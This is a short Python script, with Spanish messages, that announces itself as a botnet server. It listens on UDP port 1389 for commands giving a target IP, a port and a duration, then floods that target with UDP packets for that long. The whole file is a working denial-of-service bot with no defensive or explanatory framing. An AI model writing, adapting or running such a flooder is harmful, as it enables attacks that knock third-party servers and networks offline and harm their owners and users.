import socket
import time
scket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

h = "0.0.0.0"

p = 1389

scket.bind((h, p))

print("Servidor Activo [botnet]")

while True:

    raw_data , addr = scket.recvfrom(1024)
    print("recibido")

    mensa = raw_data.decode()

    try:

        ip1, p2_str, p3_str, p4_str = mensa.split()

        p2_str = int(p2_str)

        p3_str = int(p3_str)
        p4_str = int(p4_str)

        inic = time.time()

        while time.time() - inic < p3_str:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            d = "djdjwoqlalamalalalalal".encode()

            s.sendto(d, (ip1, p2_str))

    except Exception as e:
        print(e)